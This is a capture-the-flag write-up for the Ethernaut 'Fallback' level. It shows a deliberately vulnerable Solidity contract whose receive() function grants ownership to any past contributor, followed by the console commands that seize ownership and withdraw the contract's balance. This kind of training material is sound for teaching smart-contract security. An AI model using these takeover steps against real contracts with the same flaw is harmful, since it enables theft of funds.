<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel1.svg">

## Exploration

Given contract from Ethernaut.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```
Challenge wants us to own the contract and withdraw all contribution from the contract. For this purpose, we should contribute this contract and call ```receive()``` function. In this way, we will own of the contract and withdraw all contribution.

## Subverting
```shell
await contract.owner()
"0x9CB391dbcD447E645D6Cb55dE6ca23164130D008"
```
```shell
await contract.contribute({value: 4})
```
This notification met me.

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Fallback/img/contribute.png">

```shell
await contract.getContribution()
Object { negative: 0, words: (2) […], length: 1, red: null }
​
length: 1
​
negative: 0
​
red: null
​
words: Array [ 4, <1 empty slot> ]
​​
0: 4
​​
length: 2
​​
<prototype>: Array []
​
<prototype>: Object { _init: _init(t, e, r), _initNumber: _initNumber(t, e, r), _initArray: _initArray(t, e, r), … }
```
### JSON RPC ETH

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Fallback/img/"jsonrpc.png">

```shell
await contract.sendTransaction({value: 1})
```
```shell
await contract.owner()
"0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b"

await contract.withdraw()

await contract.getContribution()
```
And submit instance.

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Fallback/img/submit.png">

**_by wasny0ps_**
